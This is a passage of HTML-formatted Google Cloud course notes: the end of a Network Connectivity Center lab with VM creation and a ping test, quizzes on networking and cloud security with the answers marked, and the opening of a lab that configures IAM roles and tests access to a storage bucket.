GB</code></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Networking</span></strong></p><ul><li><p><span>Network interfaces</span></p><p><span> </span></p><p><span>: click on</span></p><p><span> </span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">default</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span> </span></p><p><span>to edit.</span></p><ul><li><p><strong><span>Network</span></strong><span>: </span><code>vpc-a</code></p></li><li><p><strong><span>Subnetwork</span></strong><span>: </span><code>vpc-a-sub1-use4</code></p></li></ul></li></ul></li><li><p><span>Once all sections are configured, scroll down and click </span><strong><span>Create</span></strong><span> to launch your virtual machine instance.</span></p></li></ol><p><strong><span>Note:</span></strong><span> The instance creation process is asynchronous. You can check on the status of the task using the top right-hand side </span><strong><span>Activities</span></strong><span> icon. Wait for it to finish - it shouldn&#39;t take more than a minute.</span></p><p><strong><span>Note:</span></strong><span> If you receive an error when creating a VM, click into </span><strong><span>Details</span></strong><span>. Most likely you need to try again with a different zone.</span></p><p><span>Once finished, you should see the new virtual machine in the </span><strong><span>VM Instances</span></strong><span> page.</span></p><p><span>Similarly, create another VM in </span><strong><span>vpc-b</span></strong><span> using the following parameters:</span></p><ol start='' ><li><p><span>In the </span><strong><span>Machine configuration</span></strong></p><p><span>Enter the values for the following fields:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Field</span></th><th style='text-align:left;' ><span>Value</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><strong><span>Name</span></strong></td><td style='text-align:left;' ><code>vpc-b-vm-1</code></td></tr><tr><td style='text-align:left;' ><strong><span>Region</span></strong></td><td style='text-align:left;' ><code>us-central1</code></td></tr><tr><td style='text-align:left;' ><strong><span>Zone</span></strong></td><td style='text-align:left;' ><code>us-central1-c</code></td></tr><tr><td style='text-align:left;' ><strong><span>Series</span></strong></td><td style='text-align:left;' ><code>E2</code></td></tr><tr><td style='text-align:left;' ><strong><span>Machine</span></strong></td><td style='text-align:left;' ><code>e2-medium</code></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>OS and storage</span></strong></p><p><span>Click </span><strong><span>Change</span></strong><span> to begin configuring your boot disk and select the values for:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Field</span></th><th style='text-align:left;' ><span>Value</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><strong><span>Operating system</span></strong></td><td style='text-align:left;' ><code>Debian</code></td></tr><tr><td style='text-align:left;' ><strong><span>Version</span></strong></td><td style='text-align:left;' ><code>Debian GNU/Linux 11 (bullseye) x86/64</code></td></tr><tr><td style='text-align:left;' ><strong><span>Boot disk type</span></strong></td><td style='text-align:left;' ><code>balanced persistent disk</code></td></tr><tr><td style='text-align:left;' ><strong><span>Size (GB)</span></strong></td><td style='text-align:left;' ><code>10 GB</code></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Networking</span></strong></p><ul><li><p><span>Network interfaces</span></p><p><span> </span></p><p><span>: click on</span></p><p><span> </span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">default</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span> </span></p><p><span>to edit.</span></p><ul><li><p><strong><span>Network</span></strong><span>: </span><code>vpc-b</code></p></li><li><p><strong><span>Subnetwork</span></strong><span>: </span><code>vpc-b-sub1-usw2</code></p></li></ul></li></ul></li><li><p><span>Once all sections are configured, scroll down and click </span><strong><span>Create</span></strong><span> to launch your virtual machine instance.</span></p></li></ol><p><span>Once finished, you should see the two virtual machines in the </span><strong><span>VM Instances</span></strong><span> page.</span></p><ol start='' ><li><p><span>Copy the internal IP of </span><strong><span>vpc-b-vm-1</span></strong><span>.</span></p></li></ol><p><img src="images/1uljy8fJ3Z9PN3q9BV9%2F9GVKxp9YygA8rVHPQIXdQuU%3D.png" referrerpolicy="no-referrer" alt="IP address of vpc-b-vm-1 highlighted on the VM Instances page"></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create VMs in the remote branch office VPCs</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h5 id='step-3-run-the-ping-command-and-verify-connectivity-to-bo2-via-ncc-transit-2'><span>Step 3: Run the ping command and verify connectivity to bo2 via NCC transit</span></h5><p><span>To verify the end to end connectivity, run a ping test between </span><em><span>vpc-a-vm-1</span></em><span> and </span><em><span>vpc-b-vm-1</span></em><span> using the following steps:</span></p><ol start='' ><li><p><span>SSH into </span><strong><span>vpc-a-vm-1</span></strong><span> by clicking on </span><strong><span>SSH</span></strong><span> on the right hand side of vpc-a-vm-1. This launches a SSH client directly from your browser.</span></p></li></ol><p><strong><span>Note:</span></strong><span> You can also SSH into the virtual machine. Learn more about SSH from the </span><a href='https://cloud.google.com/compute/docs/instances/connecting-to-instance'><span>Connect to an instance using ssh documentation</span></a><span>.</span></p><p>&nbsp;</p><p><img src="images/akxcwUSd1Af5FWejHAEaGAtsp7WZTFSKeWVZACNC0Zk%3D.png" referrerpolicy="no-referrer" alt="Command line terminal"></p><ol start='' ><li><p><span>Run a ping test from </span><strong><span>vpc-a-vm-1</span></strong><span> to the internal IP of </span><strong><span>vpc-b-vm-1</span></strong><span>.</span></p></li><li><p><span>You can click on the &quot;clipboard&quot; icon in the upper right corner of the text box to copy the contents.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ping -c 5 &lt;INTERNAL_IP_OF_VPC-B-VM-1&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><img src="images/JYccSGxzzFSU163WJCBgHq8wtgGuqfSlXSKKmGtsyaw%3D.png" referrerpolicy="no-referrer" alt="Command line terminal displaying ping statistics"></p><h4 id='congratulations-8'><span>Congratulations!</span></h4><p><span>This completes our lab for the Network Connectivity Center as a Transit hub with HA VPNs as spokes.</span></p><p>&nbsp;</p><h2 id='quiz-14'><span>Quiz</span></h2><ol start='' ><li><p><span>What is the purpose of a Cloud Router, and why is that important?</span></p></li></ol><ul><li><p><span>To load balance traffic across multiple Google Cloud regions and zones.</span></p></li><li><p><span>To dynamically exchange routing information using BGP between Google Cloud VPCs and other networks.</span></p></li><li><p><span>To create and manage virtual private networks (VPNs) between on-premises networks and Google Cloud.</span></p></li><li><p><span>To filter and restrict traffic based on predefined security rules.</span></p></li></ul><p><span>This is correct. Cloud Router enables dynamic routing using BGP,  allowing Google Cloud VPCs to learn routes from on-premises networks and other cloud environments.</span></p><ol start='2' ><li><p><span>In Network Connectivity Center, what are the two main types of spokes that can be connected to a hub?</span></p></li></ol><ul><li><p><span>Regional spokes and Global spokes              </span></p></li><li><p><span>VPC spokes and Global spokes              </span></p></li><li><p><span>Global spokes and Hybrid spokes              </span></p></li><li><p><span>VPC spokes and Hybrid spokes</span></p></li></ul><p><span>Correct. VPC Spokes and hybrid spokes are two types of Network Connectivity Center spokes</span></p><p>&nbsp;</p><h1 id='09-managing-security-in-google-cloud'><span>09 Managing Security in Google Cloud</span></h1><h2 id='foundations-of-google-cloud-security'><span>Foundations of Google Cloud Security</span></h2><h3 id='quiz-15'><span>Quiz</span></h3><ol start='' ><li><p><span>Which TWO of the following statements are TRUE regarding regulatory compliance on Google Cloud?</span></p></li></ol><ul><li><p><span>Contacting your regulatory compliance certification agency is the only way to find out whether Google currently supports that particular standard.</span></p></li><li><p><strong><span>Google&#39;s Cloud products regularly undergo independent verification of security, privacy, and compliance controls.</span></strong></p></li></ul><p><span>	</span><span>Correct! Google works to achieve certifications against global standards so we can earn your trust.</span></p><ul><li><p><span>Google has no plans at this time to expand its already-extensive portfolio of regulatory compliance certifications.</span></p></li><li><p><strong><span>Proper configuration of encryption and firewalls is not the only requirement for achieving regulatory compliance.</span></strong></p><p><span>Correct! You also need data protection that is in compliance with the regulatory standards you wish to meet.</span></p><p>&nbsp;</p></li></ul><ol start='2' ><li><p><span>For Platform-as-a-Service (PaaS) offerings, which of the following is NOT a customer-managed component of the shared security responsibility model?</span></p></li></ol><ul><li><p><strong><span>Network security</span></strong></p><p><span>Correct! Network security is customer-managed for Infrastructure-as-a-Service (IaaS) offerings. This is Google-managed for Platform-as-a-Service (PaaS) offerings.</span></p></li><li><p><span>Web application security</span></p></li><li><p><span>Access policies</span></p></li><li><p><span>Deployment</span></p></li></ul><p>&nbsp;</p><ol start='3' ><li><p><span>Which ONE of the following statements is TRUE concerning Google&#39;s built-in security measures?</span></p></li></ol><ul><li><p><span>An organization&#39;s on-premises resources are not allowed to connect to Google Cloud in order to lower the risk of DDoS attacks.</span></p></li><li><p><span>Customers always have the option to configure their instances to encrypt all of their data while it is &quot;at rest&quot; within Google Cloud.</span></p></li><li><p><strong><span>To guard against phishing attacks, all Google employee accounts require the use of U2F compatible security keys.</span></strong></p></li></ul><p><span>	</span><span>Correct! Google&#39;s internal security measures go beyond asking employees for a simple username and </span><span>	</span><span>password.</span></p><ul><li><p><span>Only Google-managed encryption keys are allowed to be used within Google Cloud.</span></p></li></ul><p>&nbsp;</p><ol start='4' ><li><p><span>Which of the following statements is TRUE regarding Shared Security Responsibility Model in Google Cloud?</span></p></li></ol><ul><li><p><strong><span>It is a shared responsibility between the customer and Google.</span></strong></p></li><li><p><span>The customer is responsible for the complete stack including application security and access control.</span></p></li><li><p><span>Google is responsible for the complete stack including application security and access control.</span></p></li></ul><p><span>Correct! The customer is responsible for everything brought into the cloud as well as access management, the appropriate configuration of firewalls, app security, etc. Google is responsible for the security of the cloud (i.e. the underlying layer).</span></p><p>&nbsp;</p><h2 id='securing-access-to-google-cloud'><span>Securing Access to Google Cloud</span></h2><h3 id='quiz-16'><span>Quiz</span></h3><ol start='' ><li><p><span>Which TWO of the following are considered authentication &quot;best practices?&quot;</span></p></li></ol><ul><li><p><span>Requiring 2-Step Verification (2SV) is only recommended for super-admin accounts.</span></p></li><li><p><strong><span>Avoid managing permissions on an individual user basis where possible.</span></strong></p></li></ul><p><span>Correct! Assigning users to groups and giving the group role-based permissions is much easier to manage.</span></p><ul><li><p><span>Organization Admins should never remove the default Organization-level permissions from users after account creation.</span></p></li><li><p><strong><span>You should have no more than three Organization admins.</span></strong></p></li></ul><p><span>Correct! Too many admins can create additional risk as well - the general advice is no more than three admins per organization.</span></p><ol start='2' ><li><p><span>Which of the following statements is TRUE for the use of Cloud Identity?</span></p></li></ol><ul><li><p><strong><span>Cloud Identity can work with any domain name that is able to receive email.</span></strong></p></li><li><p><span>Your organization must use Google Workspace services in order to use Cloud Identity.</span></p></li><li><p><span>You cannot use both Cloud Identity and Google Workspace services to manage your users across your domain.</span></p></li><li><p><span>A Google Workspace or Cloud Identity account can be associated with more than one Organization.</span></p></li></ul><p><span>Correct! You do not have to use Google Workspace services to use the Cloud Identity Free edition.</span></p><ol start='3' ><li><p><span>The main purpose of Google Cloud Directory Sync is to: (choose ONE option below)</span></p></li></ol><ul><li><p><strong><span>Help simplify provisioning and de-provisioning user accounts.</span></strong></p></li><li><p><span>Completely replace an Active Directory or LDAP service.</span></p></li><li><p><span>Enable two-way data synchronization between Google Cloud and AD/LDAP accounts.</span></p></li></ul><p><span>Correct! Managing user accounts manually can be tedious and time-consuming when an organization has many users.</span></p><p>&nbsp;</p><h2 id='identity-and-access-management-iam'><span>Identity and Access Management (IAM)</span></h2><h3 id='lab---configuring-iam'><span>LAB - Configuring IAM</span></h3><h4 id='overview-9'><span>Overview</span></h4><p><span>In this lab, you will configure </span><a href='https://cloud.google.com/iam'><span>Identity and Access Management (IAM)</span></a><span> to grant roles and create custom roles. IAM lets you create and manage permissions for Google Cloud resources. IAM unifies access control for Google Cloud services into a single system and presents a consistent set of operations.</span></p><h4 id='objectives-6'><span>Objectives</span></h4><p><span>In this lab, you will learn how to:</span></p><ul><li><p><span>Use IAM to implement access control.</span></p></li><li><p><span>Restrict access to specific features or resources.</span></p></li><li><p><span>Use predefined roles to provide Google Cloud access.</span></p></li><li><p><span>Create custom IAM roles to provide permissions based on your own job roles.</span></p></li><li><p><span>Modify custom roles.</span></p></li></ul><h4 id='setup-and-requirements-7'><span>Setup and requirements</span></h4><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p><h4 id='task-1-sign-in-with-two-user-accounts'><span>Task 1. Sign in with two user accounts</span></h4><p><span>In this task, you sign in using two different user accounts. These accounts are used later in the lab to explore IAM access to specific resources.</span></p><h5 id='sign-in-to-the-google-cloud-console-as-the-first-user'><span>Sign in to the Google Cloud Console as the first user</span></h5><p><span>For this lab, Qwiklabs has provisioned you with two user names available in the </span><strong><span>Connection Details</span></strong><span> dialog.</span></p><ol start='' ><li><p><span>Use a Chrome incognito window and sign in to the </span><a href='https://console.cloud.google.com/'><span>Cloud Console</span></a><span> with the </span><strong><span>Username 1</span></strong><span> provided in Qwiklabs. Note that both usernames use the same password.</span></p></li><li><p><span>Accept the Terms and Conditions for your temporary Google account.</span></p></li><li><p><span>Because this is a temporary account, do not add recovery option data or sign up for free trials.</span></p></li><li><p><span>When prompted, accept the Terms and Conditions for Google Cloud.</span></p></li></ol><h5 id='sign-in-to-the-cloud-console-as-the-second-user'><span>Sign in to the Cloud Console as the second user</span></h5><ol start='' ><li><p><span>Open another browser tab in your incognito window.</span></p></li><li><p><span>Browse to the </span><a href='https://console.cloud.google.com/'><span>Cloud Console</span></a><span>.</span></p></li><li><p><span>Click on the user icon in the top-right corner of the screen, and then click </span><strong><span>Add account</span></strong><span>.</span></p></li><li><p><span>Sign in to the Cloud Console with the </span><strong><span>Username 2</span></strong><span> provided in Qwiklabs.</span></p></li></ol><p><strong><span>Note:</span></strong><span> At some points in this lab, if you sign out of the </span><strong><span>Username 1</span></strong><span> account, the </span><strong><span>Username 2</span></strong><span> account is deleted by Qwiklabs. So be sure to remain signed in to </span><strong><span>Username 1</span></strong><span>.</span></p><h4 id='task-2-explore-current-roles-in-the-iam-console'><span>Task 2. Explore current roles in the IAM console</span></h4><p><span>In this task, you explore the current roles for Username 1 and Username 2.</span></p><h5 id='navigate-to-the-iam-console-and-explore-roles'><span>Navigate to the IAM console and explore roles</span></h5><p><span>Make sure you are on the </span><strong><span>Username 1</span></strong><span> Cloud Console tab.</span></p><ol start='' ><li><p><span>To view the </span><strong><span>IAM</span></strong><span> console, in the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>IAM &amp; admin &gt; IAM</span></strong><span>.</span></p></li><li><p><span>In the IAM console, locate the line for </span><strong><span>Username 1</span></strong><span>. Note that Username 1 has a few roles, including Project </span><strong><span>Owner</span></strong><span>.</span></p></li><li><p><span>Locate the line for </span><strong><span>Username 2</span></strong><span>. Note that Username 2 has a Project </span><strong><span>Viewer</span></strong><span> role.</span></p></li></ol><p><strong><span>Note:</span></strong><span> In the next three steps, be sure </span><strong><span>NOT</span></strong><span> to change any of the permissions. You will use the edit feature just to view the roles assigned.</span></p><ol start='' ><li><p><span>Click the Edit principal button </span><img src="https://cdn.qwiklabs.com/zxK8nW520maN72Qq6D1Lt9gCeDh7QOMGWCwhny5S8sQ%3D" referrerpolicy="no-referrer" alt="Edit icon"><span> on the line for </span><strong><span>Username 2</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Viewer</span></strong><span> to expand the list of possible roles. Do not change any of the roles yet, but you do have permissions to do so because Username 1 is project owner.</span></p></li><li><p><span>Click outside the role list to collapse it, and then click </span><strong><span>Cancel</span></strong><span>.</span></p></li><li><p><span>Switch to the Cloud Console tab for </span><strong><span>Username 2</span></strong><span>.</span></p></li><li><p><span>On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>IAM &amp; admin &gt; IAM</span></strong><span>.</span></p></li><li><p><span>Click the Edit principal button </span><img src="https://cdn.qwiklabs.com/zxK8nW520maN72Qq6D1Lt9gCeDh7QOMGWCwhny5S8sQ%3D" referrerpolicy="no-referrer" alt="Edit icon"><span> on the line for </span><strong><span>Username 2</span></strong><span>. You will not be able to edit the role. </span><strong><span>Username 2</span></strong><span> currently has access to view the project (Project Viewer), but does not have permissions to change anything.</span></p></li></ol><h4 id='task-3-prepare-a-resource-for-access-testing'><span>Task 3. Prepare a resource for access testing</span></h4><p><span>In this task, you create a Cloud Storage bucket and a sample text file. You test access to the sample file using Username 2.</span></p><h5 id='create-a-bucket-and-upload-a-sample-file'><span>Create a bucket and upload a sample file</span></h5><ol start='' ><li><p><span>Switch to the </span><strong><span>Username 1</span></strong><span> Cloud Console tab.</span></p></li><li><p><span>On the Google Cloud Console title bar, click </span><strong><span>Activate Cloud Shell</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span>). If prompted, click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>Run the following command to create a new storage bucket in </span><code>REGION</code><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud storage buckets create -l Region gs://$DEVSHELL_PROJECT_ID</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Run the following command to create a sample text file in your Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo "this is a sample file" &gt; sample.txt</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Run the following command to copy the file to the bucket just created:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud storage cp sample.txt gs://$DEVSHELL_PROJECT_ID</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Prepare a resource for access testing</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h5 id='verify-the-project-viewer-role-access'><span>Verify the Project Viewer role access</span></h5><ol start='' ><li><p><span>Switch to the </span><strong><span>Username 2</span></strong><span> Cloud Console tab.</span></p></li><li><p><span>Click </span><strong><span>Activate Cloud Shell</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span>) to open Cloud Shell. If prompted, click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>Run the following command to verify that </span><strong><span>Username 2</span></strong><span> can view the file in the bucket:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud storage ls gs://$DEVSHELL_PROJECT_ID</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; 